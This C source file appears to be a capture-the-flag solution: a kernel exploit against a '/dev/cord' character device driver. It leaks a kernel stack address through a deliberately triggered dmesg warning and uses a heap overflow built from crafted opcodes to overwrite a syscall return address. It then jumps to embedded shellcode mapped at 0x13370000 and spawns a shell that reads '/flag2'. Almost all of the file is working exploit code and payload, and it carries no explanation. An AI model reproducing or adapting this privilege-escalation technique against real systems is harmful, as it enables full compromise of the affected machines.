#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

// {{{ cord.h
#define CORDIO 217

#define CORD_GET_DEVICE_VERSION _IO(CORDIO, 0)
#define CORD_SET_DATA_WIDTH _IOR(CORDIO, 1, unsigned int)

struct cord_new_data {
	unsigned int n;
	void *data; /* @data should have @n * data_width bytes */
};

#define CORD_NEW_DATA _IOR(CORDIO, 2, struct cord_new_data)

struct cord_display {
	unsigned int cid;
	unsigned int cur, len;
	void *data; /* @data should have @len * data_width bytes */
};

struct cord_cut {
	unsigned int cid;
	unsigned int cur, len;
};

struct cord_paste {
	unsigned int cid_d;
	unsigned int cur;
	unsigned int cid_s;
};

struct cord_reverse {
	unsigned int cid;
	unsigned int cur, len;
};

struct cord_cover {
	unsigned int cid;
	unsigned int cur, len;
	unsigned long long val;
};

#define CORD_DISPLAY _IOR(CORDIO, 3, struct cord_display)
#define CORD_CUT _IOR(CORDIO, 4, struct cord_cut)
#define CORD_PASTE _IOR(CORDIO, 5, struct cord_paste)
#define CORD_DELETE _IOR(CORDIO, 6, unsigned int)
#define CORD_REVERSE _IOR(CORDIO, 7, struct cord_reverse)
#define CORD_COVER _IOR(CORDIO, 8, struct cord_cover)
// }}}

// {{{ tpu-ir
enum TPU_REG {
	TPU_R0 = 0,
	TPU_R1 = 1,
	TPU_R2 = 2,

	TPU_REG_END = 16,
};

enum TPU_OP {
	TPU_OP_NEW,
	TPU_OP_SPLIT,
	TPU_OP_MERGE,
	TPU_OP_PRINT,
	TPU_OP_INFO,
	TPU_OP_DELETE,
	TPU_OP_REVERSE,
	TPU_OP_COVER,
	TPU_OP_VERSION,
	TPU_OP_LOAD,

	TPU_OP_END = 16,
};
// }}}

#define DEVICE_NAME "/dev/cord"

typedef unsigned int uint;
typedef unsigned long long u64;

int fd;

static int set_width(int w) {
  assert(ioctl(fd, CORD_SET_DATA_WIDTH, w) == 0);
};

static int new_data(uint n, void *data) {
  struct cord_new_data cmd = {
    .n = n,
    .data = data,
  };

  return ioctl(fd, CORD_NEW_DATA, &cmd);
}

static int display(uint cid, uint cur, uint len, void *data) {
  struct cord_display cmd = {
    .cid = cid,
    .cur = cur,
    .len = len,
    .data = data
  };

  return ioctl(fd, CORD_DISPLAY, &cmd);
}

static inline int cut(uint cid, uint cur, uint len) {
  struct cord_cut cmd = {
    .cid = cid,
    .cur = cur,
    .len = len,
  };

  return ioctl(fd, CORD_CUT, &cmd);
}

void __attribute__((constructor)) setup() {
  fd = open(DEVICE_NAME, O_RDWR);
  assert(fd >= 0);
}

void reset() {
  close(fd);
  setup();
}

void test() {
  set_width(8);
  unsigned char data[0x100] = {};
  unsigned char buf[0x100] = {0,1,2,3,4,5,6,7,8,9};
  int cid = new_data(4, data);
  display(cid, 0, 4, buf);
}

/* u64 k_heap; */
u64 k_stack;
void read_addr() {
  float dummy;
  FILE *f = fopen("/home/poe/z", "r");
  fscanf(f, "[ %f] RSP: 0018:%llx", &dummy, &k_stack);
  fclose(f);
  printf("kernel stack @ %#llx\n", k_stack);
}

void leak() {
  static char buf[100];
  set_width(8);
  unsigned char data[24] = {
    0, 0, 0, // dummy, 3
    TPU_OP_INFO, 2, 0, 0, 0, // fake tid, 5

    TPU_OP_VERSION, 0, 0, // cut tid1, 3
    TPU_OP_INFO, 0, 0, 0, 0xff, // cut tid2, 5

    TPU_OP_INFO, 0, 0, 0, 0, // display tid, not important, 5
    TPU_OP_PRINT, 27, 0
  };
  // TPU_OP_INFO, <tid>, 5
  // TPU_OP_INFO, <cut tid1>, 5
  // TPU_OP_INFO, <cut tid2>, 5
  // TPU_OP_INFO, <display tid>, 5
  // TPU_OP_PRINT, 4, <chr> * 4, 6
  // TPU_OP_INFO, <tid>
  int cid = new_data(3, data);
  set_width(1);
  int consume_cid = new_data(16, buf);

  assert(display(cid, 0, 3, buf) == 0);
  cut(cid, 2, 1); // trigger WARN_ON, cid dead
  system("dmesg | grep 'RSP: 0018:' > /home/poe/z");
  read_addr();
  set_width(1);
  assert(display(consume_cid, 0, 4, buf) == 0); // consume rsp queue
}

unsigned char shellcode[] = {
  80,85,72,199,192,200,90,0,0,101,72,139,40,72,129,229,0,0,240,255,72,137,234,72,129,194,128,96,11,0,72,49,255,255,210,72,137,199,72,137,234,72,129,194,160,93,11,0,255,210,93,88,72,139,84,36,64,72,129,226,0,0,240,255,72,129,194,137,115,11,0,82,195
};
void go() {
  set_width(8);
  unsigned char *sc = (typeof(sc)) mmap((void *) 0x13370000, 0x1000, 7, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
  memcpy(sc, shellcode, sizeof(shellcode));
  unsigned char *buf = (typeof(buf)) mmap(0, 0x1000, 3, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  unsigned char data[8 * 255];
  unsigned char fake_display[] = {
    TPU_OP_INFO, 186, 0, 0, 0, // fake tid

    TPU_OP_VERSION, 0xac, 0xee,
    TPU_OP_PRINT, 0xa0, // overflow!
    /* {{{ deadbeef [ 16 * 80 ] */
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c, 0xde, 0xad, 0xbe, 0xef, 0xfa, 0xce, 0xb0, 0x0c,
    // }}}
    TPU_OP_PRINT, 1, 0, 0, 0x37, 0x13, 0, 0, 0, 0,
  };
  assert(sizeof(fake_display) + 255 <= sizeof(data));
  u64 *c = (u64 *) (fake_display + 10);
  /*
   * Wish the heap overflow could make the data pointer used by TPU_OP_PRINT
   * points to k_stack + 0x18, where is our struct cord_display data on stack.
   */
  for (int i = 0; i < 0xa0; i++)
    c[i] = k_stack + 0x18;

  memcpy(data + 255, fake_display, sizeof(fake_display));
  int cid = new_data(255, data);
  assert(cid >= 0);
  /* assert(display(cid, 0, 4, buf) == 0); */
  set_width(1);
  assert(display(cid, 0, 255, buf) == 0);
  /* getchar(); */
  system("id");
  puts("go!");
  set_width(8);
  /*
   * If the overflow succeed, handler of TPU_PRINT_OP will write
   * 0x13370000 to k_stack + 0x60, where is a return address during the
   * syscall.
   */
  display(cid, 0, 8, (void *) (k_stack + 0x60));
  execl("/bin/sh", "sh", "-c", "id;cat /flag2;sh", NULL);
}

int main() {
  /* test(); */
  leak();
  reset();
  go();
  return 0;
}
